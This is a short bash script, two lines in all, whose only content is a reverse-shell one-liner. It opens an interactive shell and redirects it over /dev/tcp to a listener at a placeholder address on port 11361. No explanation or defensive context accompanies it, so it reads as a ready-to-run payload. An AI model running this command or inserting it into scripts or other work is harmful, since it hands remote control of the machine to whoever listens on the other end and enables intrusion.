#!/bin/bash
exec /bin/bash -c 'sh -i >& /dev/tcp/0.0.0.0/11361 0>&1'